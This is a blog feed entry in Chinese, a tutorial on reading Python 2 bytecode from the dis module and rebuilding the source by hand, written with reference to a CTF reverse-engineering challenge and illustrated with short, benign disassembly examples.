<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anhkgg&#39;Lab | Windows Kernel | Rootkit | Reverse Engineer | Expolit | 内核研究 | 逆向分析 | 漏洞分析挖掘</title>
  <subtitle>Windows Kernel/Rootkit/Reverse Engineer/Expolit/内核研究/逆向分析/漏洞分析挖掘</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://anhkgg.github.io/"/>
  <updated>2018-09-04T15:29:08.761Z</updated>
  <id>https://anhkgg.github.io/</id>
  
  <author>
    <name>Anhkgg</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>死磕python字节码-手工还原python源码（网鼎杯第四场逆向题chaoyang）</title>
    <link href="https://anhkgg.github.io/python-bytecode/"/>
    <id>https://anhkgg.github.io/python-bytecode/</id>
    <published>2018-09-04T15:21:29.000Z</published>
    <updated>2018-09-04T15:29:08.761Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1.前言"></a>0x1.前言</h2><blockquote>
<p>Python 代码先被编译为字节码后，再由Python虚拟机来执行字节码， Python的字节码是一种类似汇编指令的中间语言， 一个Python语句会对应若干字节码指令，虚拟机一条一条执行字节码指令， 从而完成程序执行。<br>Python dis 模块支持对Python代码进行反汇编， 生成字节码指令。</p>
</blockquote>
<a id="more"></a>
<p><code>dis.dis()</code>将CPython字节码转为可读的伪代码(类似于汇编代码)。结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">7           0 LOAD_CONST               1 (0)</span><br><span class="line">            3 STORE_FAST               1 (local1)</span><br><span class="line"></span><br><span class="line">8           6 LOAD_CONST               2 (101)</span><br><span class="line">            9 STORE_GLOBAL             0 (global1)</span><br><span class="line"></span><br><span class="line">9          12 LOAD_FAST                1 (local1)</span><br><span class="line">           15 PRINT_ITEM</span><br><span class="line">           16 LOAD_FAST                0 (arg1)</span><br><span class="line">           19 PRINT_ITEM</span><br><span class="line">           20 LOAD_GLOBAL              0 (global1)</span><br><span class="line">           23 PRINT_ITEM</span><br><span class="line">           24 PRINT_NEWLINE</span><br><span class="line">           25 LOAD_CONST               0 (None)</span><br><span class="line">           28 RETURN_VALUE</span><br></pre></td></tr></table></figure>
<p>其实就是这样的结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">源码行号 | 指令在函数中的偏移 | 指令符号 | 指令参数 | 实际参数值</span><br></pre></td></tr></table></figure>
<h2 id="0x2-变量"><a href="#0x2-变量" class="headerlink" title="0x2.变量"></a>0x2.变量</h2><h3 id="1-const"><a href="#1-const" class="headerlink" title="1.const"></a>1.const</h3><p><code>LOAD_CONST</code>加载<code>const</code>变量，比如数值、字符串等等，一般用于传给函数的参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">55       12 LOAD_GLOBAL              1 (test)</span><br><span class="line">         15 LOAD_FAST                0 (2) #读取2</span><br><span class="line">         18 LOAD_CONST               1 (&apos;output&apos;) </span><br><span class="line">         21 CALL_FUNCTION            2</span><br></pre></td></tr></table></figure>
<p>转为python代码就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test(2, &apos;output&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="2-局部变量"><a href="#2-局部变量" class="headerlink" title="2.局部变量"></a>2.局部变量</h3><p><code>LOAD_FAST</code>一般加载局部变量的值，也就是读取值，用于计算或者函数调用传参等。<br><code>STORE_FAST</code>一般用于保存值到局部变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">61          77 LOAD_FAST                0 (n)</span><br><span class="line">             80 LOAD_FAST                3 (p)</span><br><span class="line">             83 INPLACE_DIVIDE</span><br><span class="line">             84 STORE_FAST               0 (n)</span><br></pre></td></tr></table></figure>
<p>这段bytecode转为python就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = n / p</span><br></pre></td></tr></table></figure>
<p>函数的形参也是局部变量，如何区分出是函数形参还是其他局部变量呢？</p>
<p>形参没有初始化，也就是从函数开始到<code>LOAD_FAST</code>该变量的位置，如果没有看到<code>STORE_FAST</code>，那么该变量就是函数形参。</p>
<p>而其他局部变量在使用之前肯定会使用<code>STORE_FAST</code>进行初始化。</p>
<p>具体看下面的实例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">4           0 LOAD_CONST               1 (0)</span><br><span class="line">            3 STORE_FAST               1 (local1)</span><br><span class="line"></span><br><span class="line">5           6 LOAD_FAST                1 (local1)</span><br><span class="line">            9 PRINT_ITEM</span><br><span class="line">           10 LOAD_FAST                0 (arg1)</span><br><span class="line">           13 PRINT_ITEM</span><br><span class="line">           14 PRINT_NEWLINE</span><br><span class="line">           15 LOAD_CONST               0 (None)</span><br><span class="line">           18 RETURN_VALUE</span><br></pre></td></tr></table></figure>
<p>对应的python代码如下，对比一下就一目了然。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def test(arg1):</span><br><span class="line">    local1 = 0</span><br><span class="line">    print local1, arg1</span><br></pre></td></tr></table></figure>
<h3 id="3-全局变量"><a href="#3-全局变量" class="headerlink" title="3.全局变量"></a>3.全局变量</h3><p><code>LOAD_GLOBAL</code>用来加载全局变量，包括指定函数名，类名，模块名等全局符号。</p>
<p><code>STORE_GLOBAL</code>用来给全局变量赋值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8           6 LOAD_CONST               2 (101)</span><br><span class="line">            9 STORE_GLOBAL             0 (global1)</span><br><span class="line">            20 LOAD_GLOBAL              0 (global1)</span><br><span class="line">            23 PRINT_ITEM</span><br></pre></td></tr></table></figure>
<p>对应的python代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def test():</span><br><span class="line">    global global1</span><br><span class="line">    global1 = 101</span><br><span class="line">    print global</span><br></pre></td></tr></table></figure>
<h2 id="0x3-常用数据类型"><a href="#0x3-常用数据类型" class="headerlink" title="0x3.常用数据类型"></a>0x3.常用数据类型</h2><h3 id="1-list"><a href="#1-list" class="headerlink" title="1.list"></a>1.list</h3><p><code>BUILD_LIST</code>用于创建一个list结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">13           0 LOAD_CONST               1 (1)</span><br><span class="line">             3 LOAD_CONST               2 (2)</span><br><span class="line">             6 BUILD_LIST               2</span><br><span class="line">             9 STORE_FAST               0 (k)</span><br></pre></td></tr></table></figure>
<p>对应python代码是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k = [1, 2]</span><br></pre></td></tr></table></figure>
<p>另外再看看一种常见的创建list的方式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x for x in xlist if x!=0 ]</span><br></pre></td></tr></table></figure>
<p>一个实例bytecode如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">22         235 BUILD_LIST               0 //创建list，为赋值给某变量，这种时候一般都是语法糖结构了</span><br><span class="line">           238 LOAD_FAST                3 (sieve)</span><br><span class="line">           241 GET_ITER</span><br><span class="line">       &gt;&gt;  242 FOR_ITER                24 (to 269)</span><br><span class="line">           245 STORE_FAST               4 (x)</span><br><span class="line">           248 LOAD_FAST                4 (x)</span><br><span class="line">           251 LOAD_CONST               2 (0)</span><br><span class="line">           254 COMPARE_OP               3 (!=)</span><br><span class="line">           257 POP_JUMP_IF_FALSE      242 //不满足条件contine</span><br><span class="line">           260 LOAD_FAST                4 (x)//读取满足条件的x</span><br><span class="line">           263 LIST_APPEND              2 //把每个满足条件的x存入list</span><br><span class="line">           266 JUMP_ABSOLUTE          242</span><br><span class="line">       &gt;&gt;  269 RETURN_VALUE</span><br></pre></td></tr></table></figure>
<p>转为python代码是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[for x in sieve if x != 0]</span><br></pre></td></tr></table></figure>
<h3 id="2-dict"><a href="#2-dict" class="headerlink" title="2.dict"></a>2.dict</h3><p><code>BUILD_MAP</code>用于创建一个空的dict。<code>STORE_MAP</code>用于初始化dict的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">13           0 BUILD_MAP                1</span><br><span class="line">             3 LOAD_CONST               1 (1)</span><br><span class="line">             6 LOAD_CONST               2 (&apos;a&apos;)</span><br><span class="line">             9 STORE_MAP</span><br><span class="line">            10 STORE_FAST               0 (k)</span><br></pre></td></tr></table></figure>
<p>对应的python代码是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k = &#123;&apos;a&apos;: 1&#125;</span><br></pre></td></tr></table></figure>
<p>再看看修改dict的bytecode：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">14          13 LOAD_CONST               3 (2)</span><br><span class="line">             16 LOAD_FAST                0 (k)</span><br><span class="line">             19 LOAD_CONST               4 (&apos;b&apos;)</span><br><span class="line">             22 STORE_SUBSCR</span><br></pre></td></tr></table></figure>
<p>对应的python代码是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k[&apos;b&apos;] = 2</span><br></pre></td></tr></table></figure>
<h3 id="3-slice"><a href="#3-slice" class="headerlink" title="3.slice"></a>3.slice</h3><p><code>BUILD_SLICE</code>用于创建slice。对于list、元组、字符串都可以使用slice的方式进行访问。</p>
<p>但是要注意<code>BUILD_SLICE</code>用于[x:y:z]这种类型的slice，结合<code>BINARY_SUBSCR</code>读取slice的值，结合<code>STORE_SUBSCR</code>用于修改slice的值。</p>
<p>另外<code>SLICE+n</code>用于[a:b]类型的访问，<code>STORE_SLICE+n</code>用于[a:b]类型的修改，其中<code>n</code>表示如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SLICE+0()</span><br><span class="line">Implements TOS = TOS[:].</span><br><span class="line"></span><br><span class="line">SLICE+1()</span><br><span class="line">Implements TOS = TOS1[TOS:].</span><br><span class="line"></span><br><span class="line">SLICE+2()</span><br><span class="line">Implements TOS = TOS1[:TOS].</span><br><span class="line"></span><br><span class="line">SLICE+3()</span><br><span class="line">Implements TOS = TOS2[TOS1:TOS].</span><br></pre></td></tr></table></figure>
<p>下面看具体实例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">13           0 LOAD_CONST               1 (1)</span><br><span class="line">              3 LOAD_CONST               2 (2)</span><br><span class="line">              6 LOAD_CONST               3 (3)</span><br><span class="line">              9 BUILD_LIST               3</span><br><span class="line">             12 STORE_FAST               0 (k1) //k1 = [1, 2, 3]</span><br><span class="line"></span><br><span class="line"> 14          15 LOAD_CONST               4 (10)</span><br><span class="line">             18 BUILD_LIST               1</span><br><span class="line">             21 LOAD_FAST                0 (k1)</span><br><span class="line">             24 LOAD_CONST               5 (0)</span><br><span class="line">             27 LOAD_CONST               1 (1)</span><br><span class="line">             30 LOAD_CONST               1 (1)</span><br><span class="line">             33 BUILD_SLICE              3</span><br><span class="line">             36 STORE_SUBSCR                    //k1[0:1:1] = [10]</span><br><span class="line"></span><br><span class="line"> 15          37 LOAD_CONST               6 (11)</span><br><span class="line">             40 BUILD_LIST               1</span><br><span class="line">             43 LOAD_FAST                0 (k1)</span><br><span class="line">             46 LOAD_CONST               1 (1)</span><br><span class="line">             49 LOAD_CONST               2 (2)</span><br><span class="line">             52 STORE_SLICE+3                   //k1[1:2] = [11]</span><br><span class="line"></span><br><span class="line"> 16          53 LOAD_FAST                0 (k1)</span><br><span class="line">             56 LOAD_CONST               1 (1)</span><br><span class="line">             59 LOAD_CONST               2 (2)</span><br><span class="line">             62 SLICE+3</span><br><span class="line">             63 STORE_FAST               1 (a)  //a = k1[1:2]</span><br><span class="line"></span><br><span class="line"> 17          66 LOAD_FAST                0 (k1)</span><br><span class="line">             69 LOAD_CONST               5 (0)</span><br><span class="line">             72 LOAD_CONST               1 (1)</span><br><span class="line">             75 LOAD_CONST               1 (1)</span><br><span class="line">             78 BUILD_SLICE              3</span><br><span class="line">             81 BINARY_SUBSCR</span><br><span class="line">             82 STORE_FAST               2 (b) //b = k1[0:1:1]</span><br></pre></td></tr></table></figure>
<h2 id="0x4-循环"><a href="#0x4-循环" class="headerlink" title="0x4.循环"></a>0x4.循环</h2><p><code>SETUP_LOOP</code>用于开始一个循环。<code>SETUP_LOOP              26 (to 35)</code>中<code>35</code>表示循环退出点。</p>
<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">23           0 LOAD_CONST               1 (0)</span><br><span class="line">             3 STORE_FAST               0 (i) // i=0</span><br><span class="line"></span><br><span class="line">24           6 SETUP_LOOP              26 (to 35)</span><br><span class="line">       &gt;&gt;    9 LOAD_FAST                0 (i) //循环起点</span><br><span class="line">            12 LOAD_CONST               2 (10)</span><br><span class="line">            15 COMPARE_OP               0 (&lt;)</span><br><span class="line">            18 POP_JUMP_IF_FALSE       34     //while i &lt; 10:</span><br><span class="line"></span><br><span class="line">25          21 LOAD_FAST                0 (i)</span><br><span class="line">            24 LOAD_CONST               3 (1)</span><br><span class="line">            27 INPLACE_ADD                     </span><br><span class="line">            28 STORE_FAST               0 (i) // i += 1</span><br><span class="line">            31 JUMP_ABSOLUTE            9    // 回到循环起点</span><br><span class="line">       &gt;&gt;   34 POP_BLOCK</span><br><span class="line">       &gt;&gt;   35 LOAD_CONST               0 (None)</span><br></pre></td></tr></table></figure>
<p>对应python代码是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i = 0</span><br><span class="line">    while i &lt; 10:</span><br><span class="line">        i += 1</span><br></pre></td></tr></table></figure>
<h3 id="for-in结构"><a href="#for-in结构" class="headerlink" title="for in结构"></a>for in结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    238 LOAD_FAST                3 (sieve)#sieve是个list</span><br><span class="line">    241 GET_ITER                    //开始迭代sieve</span><br><span class="line">&gt;&gt;  242 FOR_ITER                24 (to 269) //继续iter下一个x</span><br><span class="line">    245 STORE_FAST               4 (x)</span><br><span class="line">    ...</span><br><span class="line">    266 JUMP_ABSOLUTE          242 //循环</span><br></pre></td></tr></table></figure>
<p>这是典型的for+in结构，转为python代码就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for x in sieve:</span><br></pre></td></tr></table></figure>
<h2 id="0x5-if"><a href="#0x5-if" class="headerlink" title="0x5.if"></a>0x5.if</h2><p><code>POP_JUMP_IF_FALSE</code>和<code>JUMP_FORWARD</code>一般用于分支判断跳转。<code>POP_JUMP_IF_FALSE</code>表示条件结果为<code>FALSE</code>就跳转到目标偏移指令。<code>JUMP_FORWARD</code>直接跳转到目标偏移指令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">23           0 LOAD_CONST               1 (0)</span><br><span class="line">             3 STORE_FAST               0 (i) //i=0</span><br><span class="line">24           6 LOAD_FAST                0 (i)</span><br><span class="line">             9 LOAD_CONST               2 (5)</span><br><span class="line">            12 COMPARE_OP               0 (&lt;)</span><br><span class="line">            15 POP_JUMP_IF_FALSE       26</span><br><span class="line"></span><br><span class="line">25          18 LOAD_CONST               3 (&apos;i &lt; 5&apos;)</span><br><span class="line">            21 PRINT_ITEM</span><br><span class="line">            22 PRINT_NEWLINE</span><br><span class="line">            23 JUMP_FORWARD            25 (to 51)</span><br><span class="line"></span><br><span class="line">26     &gt;&gt;   26 LOAD_FAST                0 (i)</span><br><span class="line">            29 LOAD_CONST               2 (5)</span><br><span class="line">            32 COMPARE_OP               4 (&gt;)</span><br><span class="line">            35 POP_JUMP_IF_FALSE       46</span><br><span class="line"></span><br><span class="line">27          38 LOAD_CONST               4 (&apos;i &gt; 5&apos;)</span><br><span class="line">            41 PRINT_ITEM</span><br><span class="line">            42 PRINT_NEWLINE</span><br><span class="line">            43 JUMP_FORWARD             5 (to 51)</span><br><span class="line"></span><br><span class="line">29     &gt;&gt;   46 LOAD_CONST               5 (&apos;i = 5&apos;)</span><br><span class="line">            49 PRINT_ITEM</span><br><span class="line">            50 PRINT_NEWLINE</span><br><span class="line">       &gt;&gt;   51 LOAD_CONST               0 (None)</span><br></pre></td></tr></table></figure>
<p>转为python代码是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = 0</span><br><span class="line">if i &lt; 5:</span><br><span class="line">    print &apos;i &lt; 5&apos;</span><br><span class="line">elif i &gt; 5:</span><br><span class="line">    print &apos;i &gt; 5&apos;</span><br><span class="line">else:</span><br><span class="line">    print &apos;i = 5&apos;</span><br></pre></td></tr></table></figure>
<h2 id="0x6-分辨函数"><a href="#0x6-分辨函数" class="headerlink" title="0x6.分辨函数"></a>0x6.分辨函数</h2><h3 id="1-函数范围"><a href="#1-函数范围" class="headerlink" title="1.函数范围"></a>1.函数范围</h3><p>前面介绍第二列表示指令在函数中的偏移地址，所以看到0就是函数开始，下一个0前一条指令就是函数结束位置，当然也可以通过<code>RETURN_VALUE</code>来确定函数结尾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">54         0 LOAD_FAST                1 (plist) //函数开始</span><br><span class="line">           3 LOAD_CONST               0 (None)</span><br><span class="line">           6 COMPARE_OP               2 (==)</span><br><span class="line">           9 POP_JUMP_IF_FALSE        33</span><br><span class="line"></span><br><span class="line">55         ...</span><br><span class="line"></span><br><span class="line">67     &gt;&gt;  139 LOAD_FAST              2 (fs)</span><br><span class="line">           142 RETURN_VALUE</span><br><span class="line">70         0 LOAD_CONST               1 (&apos;FLAG&apos;) //另一个函数开始</span><br><span class="line">           3 STORE_FAST               0 (flag)</span><br></pre></td></tr></table></figure>
<h3 id="2-函数调用"><a href="#2-函数调用" class="headerlink" title="2.函数调用"></a>2.函数调用</h3><p>函数调用类似于<code>push+call</code>的汇编结构，压栈参数从左到右依次压入（当然不是<code>push</code>，而是读取指令<code>LOAD_xxxx</code>来指定参数）。</p>
<p>函数名一般通过<code>LOAD_GLOBAL</code>指令指定，如果是模块函数或者类成员函数通过<code>LOAD_GLOBAL</code>+<code>LOAD_ATTR</code>来指定。</p>
<p>先指定要调用的函数，然后压参数，最后通过<code>CALL_FUNCTION</code>调用。</p>
<p><code>CALL_FUNCTION</code>后面的值表示有几个参数。</p>
<p>支持嵌套调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">6           0 LOAD_GLOBAL              0 (int) //int函数</span><br><span class="line">              3 LOAD_GLOBAL              1 (math)//math模块</span><br><span class="line">              6 LOAD_ATTR                2 (sqrt)//sqrt函数</span><br><span class="line">              9 LOAD_FAST                0 (n) //参数</span><br><span class="line">             12 CALL_FUNCTION            1</span><br><span class="line">             15 CALL_FUNCTION            1</span><br><span class="line">             18 STORE_FAST               2 (nroot)</span><br></pre></td></tr></table></figure>
<p>这段<code>bytecode</code>转换成<code>python</code>代码就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nroot = int(math.sqrt(n)) //其中n是一个局部变量或者函数参数，具体看上下文</span><br></pre></td></tr></table></figure>
<h2 id="0x7-其他指令"><a href="#0x7-其他指令" class="headerlink" title="0x7.其他指令"></a>0x7.其他指令</h2><p>其他常见指令，一看就明白，就不具体分析了，更多详细内容请看<a href="https://docs.python.org/2/library/dis.html" target="_blank" rel="noopener">官方文档</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">INPLACE_POWER()</span><br><span class="line">Implements in-place TOS = TOS1 ** TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_MULTIPLY()</span><br><span class="line">Implements in-place TOS = TOS1 * TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_DIVIDE()</span><br><span class="line">Implements in-place TOS = TOS1 / TOS when from __future__ import division is not in effect.</span><br><span class="line"></span><br><span class="line">INPLACE_FLOOR_DIVIDE()</span><br><span class="line">Implements in-place TOS = TOS1 // TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_TRUE_DIVIDE()</span><br><span class="line">Implements in-place TOS = TOS1 / TOS when from __future__ import division is in effect.</span><br><span class="line"></span><br><span class="line">INPLACE_MODULO()</span><br><span class="line">Implements in-place TOS = TOS1 % TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_ADD()</span><br><span class="line">Implements in-place TOS = TOS1 + TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_SUBTRACT()</span><br><span class="line">Implements in-place TOS = TOS1 - TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_LSHIFT()</span><br><span class="line">Implements in-place TOS = TOS1 &lt;&lt; TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_RSHIFT()</span><br><span class="line">Implements in-place TOS = TOS1 &gt;&gt; TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_AND()</span><br><span class="line">Implements in-place TOS = TOS1 &amp; TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_XOR()</span><br><span class="line">Implements in-place TOS = TOS1 ^ TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_OR()</span><br><span class="line">Implements in-place TOS = TOS1 | TOS.</span><br></pre></td></tr></table></figure>
<p>基础运算还有一套对应的<code>BINARY_xxxx</code>指令，两者区别很简单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i += 1 //使用INPLACE_xxx</span><br><span class="line">i = i + 1 //使用BINARY_xxxx</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
<li><a href="https://docs.python.org/2/library/dis.html" target="_blank" rel="noopener">python dis官方文档</a></li>
<li><a href="https://www.google.com/search?newwindow=1&amp;client=firefox-b-ab&amp;biw=1920&amp;bih=938&amp;ei=GUSGW4OeEor6wAOt8ZyQCw&amp;q=python+%E2%80%9CROT_THREE%E2%80%9D&amp;oq=python+%E2%80%9CROT_THREE%E2%80%9D&amp;gs_l=psy-ab.3..0i71k1l8.737846.738207.0.738259.3.3.0.0.0.0.0.0..0.0....0...1c.1.64.psy-ab..3.0.0....0.PcHujQY7ZAE" target="_blank" rel="noopener">google搜索dis指令</a></li>
<li><a href="https://github.com/vstinner/bytecode" target="_blank" rel="noopener">https://github.com/vstinner/bytecode</a></li>
<li><a href="https://blog.hakril.net/articles/2-understanding-python-execution-tracer.html" target="_blank" rel="noopener">https://blog.hakril.net/articles/2-understanding-python-execution-tracer.html</a></li>
<li><a href="https://qingyunha.github.io/taotao/" target="_blank" rel="noopener">A Python Interpreter Written in Python</a></li>
<li><a href="https://blog.csdn.net/qs9816/article/details/51661659" target="_blank" rel="noopener">https://blog.csdn.net/qs9816/article/details/51661659</a></li>
<li><a href="https://github.com/Mysterie/uncompyle2" target="_blank" rel="noopener">https://github.com/Mysterie/uncompyle2</a></li>
</ol>
<p>转载请注明出处：<a href="https://anhkgg.github.io/python-bytecode/">https://anhkgg.github.io/python-bytecode/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x1-前言&quot;&gt;&lt;a href=&quot;#0x1-前言&quot; class=&quot;headerlink&quot; title=&quot;0x1.前言&quot;&gt;&lt;/a&gt;0x1.前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Python 代码先被编译为字节码后，再由Python虚拟机来执行字节码， Python的字节码是一种类似汇编指令的中间语言， 一个Python语句会对应若干字节码指令，虚拟机一条一条执行字节码指令， 从而完成程序执行。&lt;br&gt;Python dis 模块支持对Python代码进行反汇编， 生成字节码指令。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
